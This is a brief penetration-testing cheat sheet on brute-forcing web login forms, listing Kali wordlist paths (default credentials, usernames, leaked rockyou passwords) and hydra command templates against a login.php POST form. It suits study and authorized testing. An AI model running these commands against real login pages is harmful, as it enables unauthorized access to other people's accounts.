---
id: login-brute-force
title: Login brute force
---

# Login brute force

## Lists in Kali

### Usernames and passwords

```
/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
```

### Usernames

```
/opt/useful/SecLists/Usernames/Names/names.txt
```

### Passswords

```
/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

## hydra

### Using a user and password list

```bash
hydra -C <list> -s <port> -f <host> http-post-form "/login.php:username=^USER^&password=^PASS^:Login"
```

### Using user admin and password list

```bash
hydra -l admin -P <passwords> -s <port> -f <host> http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login"
```

### Using different lists for username and password

```bash
hydra -L <usernames> -P <passwords> -s <port> -f <host> http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login"
```
